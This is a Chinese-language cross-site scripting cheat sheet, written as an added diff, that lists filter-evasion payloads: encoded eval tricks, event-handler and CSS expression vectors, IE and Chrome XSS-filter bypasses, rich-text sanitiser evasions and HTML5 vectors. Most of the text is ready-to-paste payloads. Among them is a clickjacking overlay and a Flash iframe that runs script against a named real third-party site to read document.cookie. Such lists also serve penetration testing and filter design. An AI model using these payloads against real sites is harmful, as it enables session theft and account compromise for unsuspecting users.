@@ -1,0 +1,126 @@
+1)String.fromCharCode
+fromCharCode可以对利用代码中的引号进行编码处理，但是需要利用eval函数结合进行使用，例如:
+<script>alert(‘insight-labs’)</script>  —–>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,39,105,110,115,105,103,104,116,45,108,97,98,115,39,41))</script>
+
+2)location.hash
+将带有引号的内容放在location.hash中，其实这个也可以突破跨站长度的控制。
+<script>eval(location.hash.slice(1))</script>#alert(‘a’)
+
+3)/string/.source
+/string/中的string表示的是正则表达式，用.source则可以取到正则表达式的文本形式，然后使用eval(/string/.source);就可以执行。
+1.1.2 尖括号
+通常程序员为了偷懒都只会过滤尖括号，因此尖括号在跨站过滤中遇到情况最多。一般情况下如果输入没有显示在其他标签里，那么基本上是没有办法进行攻击的，但是如果是输出到其他标签里，则可以结合上下标签进行如下测试：
+1）事件函数
+常用的一些事件函数有：onerror、onmouseover、onload等(同时可以关注下HTML5新标签)，需要的时候可以对JavaScript的事件函数进行fuzz。
+                  <img src=x onerror=alert(/insight-labs/)>
+                    <p onmouseover=alert(/insight-labs/)>insight-labs here.</p>
+                    <frameset onload=alert(/insight-labs/)>
+                    <body onload=alert(/insight-labs/)>
+2)style与expression
+通过标签的style样式进行跨站(测试中只有IE成功，同时还得考虑filter问题)。
+<div style=”width:expression(alert(‘insight-labs’));”>
+3) JavaScript伪协议
+JavaScript伪协议进行绕过。
+<img src=javascript:alert(‘insight-labs’)> （仅IE6)
+1.1.3 括号
+如果测试中发现括号被过滤了，或者无法注入括号，可以进行如下测试：
+1）外部文件
+通过src引入外部文件，而利用代码放在外部文件中（其中外部文件的后缀可以不为js）。
+        <script src=’1.js’></script>
+         <script src=’2.jpg’></script>
+2）hex、dec编码
+利用十六进制与十进制进行编码。
+<div style=”&#119&#105&#100&#116&#104&#58&#101&#120&#112&#114&#101&#115&#115&#105&#111&#110&#40&#97&#108&#101&#114&#116&#40&#39&#120&#115&#115&#101&#114&#39&#41&#41″>xsser</div>
+1.2 bypass filter
+针对跨站问题日益严重，浏览器厂商从自身浏览器安全出发推出了各自的跨站过滤器。但是这类过滤器基本上只支持反射型跨站，其他类型跨站基本不受影响。
+各种浏览器采用的防御机制各不相同。反射型跨站防御方面：Firefox基本没什么防御，而IE和chrome都有各自的防御机制，并且都很难绕过，这里主要总结下现有的一些可以绕过机制。
+1.2.1 IE Filter
+IE从IE7就支持XSS Filter，其整体架构可见参考文献1，正则匹配部分可以参见文献2。实际处理步骤可分为三步：首先对IE进行启发式过滤（heuristic filters，正则匹配）；如果在HTTP请求中匹配到这些特征，那么就做一个动态签名（create dynamic signature）；如果在HTTP响应中有原来的签名，那么就进行替换修改（neuter response）。在IE全补丁下进行测试，现有公布的绕过技术基本上很少，先总结如下：
+1）<a href=>
+针对普通的反射型跨站，可以利用A标签和“sc%0aript”实现绕过，不过需要用户交互，这里需要美工师咯。其实原理是页面输出后这两个页面属于同一域，因此不会产生过滤。如果href里面的地址是不同域就会产生过滤。
+         <a href=”xss.php?a=<sc%0aript>alert(/insight-labs/)</script>”>
+          <a href=”xss.php?a=<sc%0aript>alert(/insight-labs/)</script>”><div style=”position: absolute; left: 0px; top: 0px; height: 1000px; width: 1000px; padding: 1em;background:black;text-align: center;”>click to continue</div></a>
+http://vulnerabledoma.in/xssable?q =％22％3CA％20href％3Djavascript％26.x3A的％3Balert％26％28×28％3B1％26％29×29％3B / / =％3Exxx
+          http://vulnerabledoma.in/xssable?q=”<a href=javascript&.x3A;alert&(x28;1&)x29;//=>xxx
+  
+2）utf7
+通过UTF7-BOM实现注入代码，全补丁情况下只有当header里编码为utf-7才能成功，可以参考文献3。
+%2BACIAPgA8-script%2BAD4-alert%28/insight-labs/%29%2BADw-%2Fscript%2BAD4APAAi-&oe=Windows-31J
+3) Flash
+在 www.B.com域名下用iframe嵌入www.A.com的flash XSS文件。当受害者打开了www.B.com的域名时，我们可以成功获取其在www.A.com的cookies数据，参见文献8。
+测试代码如下(IE)：
+<iframe/src=”http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=(function(){location.href=%22javascript:’<script>alert(document.cookie)</script>’%22})()”></iframe> 
+在chrome中，可能会导致浏览器崩溃，可以改用以下代码。
+<iframe/src=”http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=(function(){alert(document.cookie)})()”></iframe>
+4) magic_quotes_gpc
+PHP如果开启了”魔术引号”特性(magic_quotes_gpc = On),则’ (single-quote), “(double quote), \(backslash) 和 NULL 字符将都会被反斜杠转义(%00 =>\0).
+通过一些测试,发现ie xss filter对NULL字符的转义处理并不感冒,意思是它并不了解这种转换过程。参见文献9
+<script/%00%00v%00%00>alert(1)</script>
+%c0”;alert(%00)//
+
+%c0”//(%000000%0dalert(1)//
+1.2.2 chrome filter
+chrome浏览器针对xss过滤规则跟IE有比较大的区别，不同版本的chrome测试也会不同，现有的资料可以参考文献4、5。
+1） data协议
+?vuln=<a href="javascript:alert(document.cookie);">click</a> //会拦截转换成  <a href="javascript:void(0)">click</a>
+
+//bypass
+
+?vuln=<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gd29ybGQhJyk8L3NjcmlwdD4=">click<a>
+1.3 bypass richtext
+富文本常见类别有留言，日志或者邮件等。与一般的跨站相比它可以使用现有的标签进行测试分析。一般过滤机制分为两种：黑名单、白名单，这两类机制实质都是基于正则匹配进行过滤，因此在测试过程中需要对比输入和输出，然后进行针对性变化。
+常见测试流程：输入常见标签和事件——>是否有存在的标签没有过滤——->变形或者分析其属性
+标签：object, applet, base, link, meta, import, embed, vmlframe, iframe, script, style, isindex, form，textarea，
+字符：javascript:, vbscript:
+事件：onload,onerror,on*
+1.3.1 绕过规则
+本小节将一些常见的一些变化规则进行了归类，实际测试中结合多种方式进行组合测试。
+ 1）未递归过滤
+很多富文本过滤都是针对关键字过滤，但是没有进行递归过滤，导致过滤后的结果重新组成新的标签，例如：
+                  <ifra<iframe>me>之——过滤——<iframe>———-<iframe>
+                   <s<script></script>cript>—–过滤—<script>———-<script></script>
+  2)编码
+利用字符的十六进制和十进制编码进行绕过关键字。由于expression只有IE能执行，因此仅限于IE。
+<div style=”width:expression(alert(/insight-labs/))”>insight-labs</div> 
+
+<div style=”width:\0065xpression(alert(/insight-labs/))”>insight-labs</div>
+//两次不同类型编码
+
+<div style=”width:\0065xpressio\6e(alert(/insight-labs/))”>insight-labs</div> 
+
+<div style=”&#119&#105&#100&#116&#104&#58&#101&#120&#112&#114&#101&#115&#115&#105&#111&#110&#40&#97&#108&#101&#114&#116&#40&#39&#120&#115&#115&#101&#114&#39&#41&#41″>xsser</div>
+       3)特殊字符
+在构造的vector中可以插入tab、换行、等其他空白字符或者”/**”绕过关键字匹配，基本上也只限于IE。
+<img src="java       scr    ipt:alert(/insight-labs/)">  //两次tab,ie6
+
+         <div style="width:exp/**
+
+**/ression(alert(/insight-labs/))">insight-labs</div>  //换行,IE
+4)非常见协议
+利用object标签，将date属性数据进行base64编码绕过关键数据，同时object标签也是经常被遗忘的标签。
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgvaW5zaWdodC1sYWJzLyk8L3NjcmlwdD4=">
+5)HTML5
+利用HTML5新标签或者新属性进行绕过，相对而言这类利用要求的环境相对比较苛刻，详细见参考文献6。
+新标签:<button>,<video>,<audio>,<article>,<footer>,<nav>
+新属性:autocomplete, autofocus, pattern ..etc
+         <input onfocus=write(1) autofocus>
+         <video poster=javascript:alert(1)//></video>
+6)浏览器方面
+可以从浏览器解析角度进行考虑，需要浏览器解析方面进行深入分析，然后进行改进与分析，提供几个这类的vector。
+// IE的注释方式
+<!–[if IE]><img src=# width=0 height=0 onerror=alert(/insight-labs/)><![endif]–> 
+         <comment><img src=”</comment><img src=x onerror=alert(/insight-labs/)//”>   IE
+1.3.2 利用技巧
+在实际利用中常常会遇到一些其它问题，比如说代码死循环，长度不够用等先将其总结如下：
+ 
+1)expression
+由于expression属性比较特殊,同时只支持IE，而其执行相当于一个死循环的EVAL函数，同时style标记里不能出现”;”字符，也就是不能构造多条连接在一起的javascript，因此构造出如下语句：
+
+<DIV STYLE=”xss:ex/**/pre/**/ssion(eval(xss));” xss=”var Then=new Date();Then.setTime(Then.getTime()+10*1000);if(document.cookie.indexOf(‘Cookie1=’) == -1){document.cookie=’Cookie1=RAY;expires=’+Then.toGMTString();alert(/insight-labs/);}”>
+//设置一个COOKIE在10秒后失效，并在这条COOKIE语句中执行其他语句或函数。
+也可以通过window对象来实现：
+<div style=”width:expression((window.x==1)?”:(window.x=1,alert(/insight-labs/)))”>xsser</div>
+
+2)长度限制
+这个在”突破XSS字符数量限制执行任意JS代码”一文中有详细讲解，参考文献7。当然在支持HTML5的浏览器还可以利用下本地存储。
